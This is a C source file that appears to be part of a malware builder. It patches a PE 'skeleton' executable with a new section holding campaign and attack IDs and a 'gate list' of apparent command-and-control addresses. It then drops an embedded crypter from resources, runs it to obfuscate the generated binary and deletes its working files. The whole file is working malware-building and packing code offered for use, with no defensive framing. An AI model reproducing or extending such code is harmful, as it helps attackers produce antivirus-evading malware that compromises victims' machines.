#include "wrap_gen.h"

BOOL generate_template(	__in	LPCSTR	gate_list,
						__in	PDWORD	skeleton,
						__in	UINT	skeleton_size,
						__in	UINT	campaign_id,
						__in	UINT	attack_id,
						__out	PDWORD	*pe,
						__out	PUINT	size) 
{
	ERROR_CODE					status;

	SKELETON_DATA				skel_data;

	PIMAGE_DOS_HEADER			dos_header;
	PIMAGE_NT_HEADERS			nt_headers;
	PIMAGE_SECTION_HEADER		last_section_header, data_section_header;;

	// Reallocate + one page
	*pe					= (PDWORD)HeapAlloc(GetProcessHeap(), 0, (UINT)((UINT)skeleton_size + 0x1000));
	ZeroMemory((PVOID)(*pe), (UINT)((UINT)skeleton_size + 0x1000));
	CopyMemory((PVOID)(*pe), (PVOID)skeleton, skeleton_size);

	// Go to last segment
	dos_header			= (PIMAGE_DOS_HEADER)(*pe);
	nt_headers			= (PIMAGE_NT_HEADERS)((DWORD_PTR)dos_header + dos_header->e_lfanew);
	last_section_header	= (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(nt_headers) 
							+ (sizeof(IMAGE_SECTION_HEADER) * (nt_headers->FileHeader.NumberOfSections - 1)));
	data_section_header	= (PIMAGE_SECTION_HEADER)((DWORD_PTR)last_section_header + sizeof(IMAGE_SECTION_HEADER));

	// Build last segment
	data_section_header->Misc.VirtualSize	= 0x1000;
	data_section_header->VirtualAddress		= (DWORD)round(((DWORD)last_section_header->VirtualAddress + last_section_header->Misc.VirtualSize), nt_headers->OptionalHeader.SectionAlignment);
	data_section_header->SizeOfRawData		= round(sizeof(SKELETON_DATA) + string_length(gate_list), nt_headers->OptionalHeader.FileAlignment);
	data_section_header->PointerToRawData	= round((UINT)(last_section_header->PointerToRawData + last_section_header->SizeOfRawData), nt_headers->OptionalHeader.FileAlignment);
	data_section_header->Characteristics	= 0xc0000040;
	CopyMemory(data_section_header->Name, SKEL_DATA_SEGMENT_NAME, string_length(SKEL_DATA_SEGMENT_NAME));

	// Fix up headers
	nt_headers->FileHeader.NumberOfSections++;
	nt_headers->OptionalHeader.SizeOfImage = (DWORD)(data_section_header->VirtualAddress + data_section_header->Misc.VirtualSize);

	// Install data into last segment
	ZeroMemory(&skel_data, sizeof(skel_data));
	skel_data.attack_id			= attack_id;
	skel_data.campaign_id		= campaign_id;
	skel_data.signature			= SKEL_DATA_SIG;
	CopyMemory((PVOID)((DWORD_PTR)dos_header + data_section_header->PointerToRawData), (PVOID)&skel_data, sizeof(skel_data));
	CopyMemory((PVOID)((DWORD_PTR)dos_header + data_section_header->PointerToRawData + sizeof(skel_data)), gate_list, string_length(gate_list));

	// Exit subroutines
	*size						= (UINT)((UINT)skeleton_size + 0x1000);

	return TRUE;
}

BOOL crypt_template(LPCSTR template_path, LPCSTR crypted_path)
{
	ERROR_CODE			status;
	CHAR				temp_path[MAX_PATH]				= {0};
	CHAR				tmp_file_path[MAX_PATH];
	CHAR				delete_command[1024]			= {0};
	CHAR				crypt_command[2048]				= {0};
	CHAR				kpcoe_skeleton_file_path[MAX_PATH]	= {0};

	PDWORD				config_file, new_config_file;
	UINT				config_file_size, new_config_file_size;

	PBYTE				ptr;

	// Create working space for KPCOE
	GetTempPathA(sizeof(temp_path), temp_path);
	PathCombineA(temp_path, temp_path, KPCOE_WORKING_DIRECTORY);
	status = CreateDirectoryA(temp_path, NULL);
	if (!status) {
		
		if (GetLastError() == ERROR_ALREADY_EXISTS) {

			_snprintf(delete_command, sizeof(delete_command), "del /Q %s\\*.*", temp_path);
			system(delete_command);

			status = RemoveDirectoryA(temp_path);
			if (!status) {
				return FALSE;
			}

			status = CreateDirectoryA(temp_path, NULL);
			if (!status) {
				return FALSE;
			}
		}
	}

	// Write resources
	ZeroMemory(tmp_file_path, sizeof(tmp_file_path));
	PathCombineA(tmp_file_path, temp_path, KPCOE_CRYPTER);
	status =	write_resource_to_file(tmp_file_path, MAKEINTRESOURCEA(IDR_KPCOE1), "KPCOE");

	ZeroMemory(tmp_file_path, sizeof(tmp_file_path));
	PathCombineA(tmp_file_path, temp_path, KPCOE_SKELETON);
	status |=	write_resource_to_file(tmp_file_path, MAKEINTRESOURCEA(IDR_KPCOE_SKEL1), "KPCOE_SKEL");

	ZeroMemory(tmp_file_path, sizeof(tmp_file_path));
	PathCombineA(tmp_file_path, temp_path, KPCOE_CONFIG);
	status |=	write_resource_to_file(tmp_file_path, MAKEINTRESOURCEA(IDR_KPCOE_CFG1), "KPCOE_CFG");

	// Modify the config file
	read_raw_into_buffer(tmp_file_path, &config_file_size, (LPVOID *)&config_file);
	ptr = (PBYTE)config_file;
	while (strncmp(ptr, "Skeleton file=", strlen("Skeleton file="))) {
		ptr++;
	}
	ptr = (PBYTE)((DWORD_PTR)ptr + strlen("Skeleton file="));
	_snprintf(kpcoe_skeleton_file_path, sizeof(kpcoe_skeleton_file_path), "%s\\%s", temp_path, KPCOE_SKELETON);
	new_config_file_size = config_file_size + strlen(kpcoe_skeleton_file_path);
	new_config_file = (PDWORD)HeapAlloc(GetProcessHeap(), 0, new_config_file_size);
	ZeroMemory(new_config_file, new_config_file_size);
	CopyMemory(new_config_file, config_file, (UINT)((DWORD_PTR)ptr - (DWORD_PTR)config_file));
	CopyMemory((PVOID)((DWORD_PTR)new_config_file + (UINT)((DWORD_PTR)ptr - (DWORD_PTR)config_file)), kpcoe_skeleton_file_path, strlen(kpcoe_skeleton_file_path));
	CopyMemory((PVOID)((DWORD_PTR)new_config_file + (UINT)((DWORD_PTR)ptr - (DWORD_PTR)config_file) + strlen(kpcoe_skeleton_file_path)),
		(PVOID)ptr, strlen(ptr));
	write_raw_to_disk(tmp_file_path, new_config_file, new_config_file_size);

	// Crypt
	_snprintf(crypt_command, sizeof(crypt_command), "%s\\%s -t %s -n %s -c %s\\%s", temp_path, KPCOE_CRYPTER, template_path, crypted_path, temp_path, KPCOE_CONFIG);
	system(crypt_command);

	// Cleanup
	ZeroMemory(delete_command, sizeof(delete_command));
	_snprintf(delete_command, sizeof(delete_command), "del /Q %s\\*.*", temp_path);
	system(delete_command);
}

BOOL write_resource_to_file(LPCSTR file_path, LPCSTR name, LPCSTR type)
{
	ERROR_CODE			status;
	HRSRC				resource;
	HGLOBAL				global;
		


	resource = FindResourceA(GetModuleHandle(NULL), name, type);
	if (resource == NULL) {
		return FALSE;
	}
	
	global = LoadResource(GetModuleHandle(NULL), resource);
	if (global == NULL) {
		return FALSE;
	}

	LockResource(resource);

	status = write_raw_to_disk(file_path, (PDWORD)global, (UINT)SizeofResource(GetModuleHandle(NULL), resource));
	if (!status) {
		return FALSE;
	}

	FreeResource(resource);

	return TRUE;
}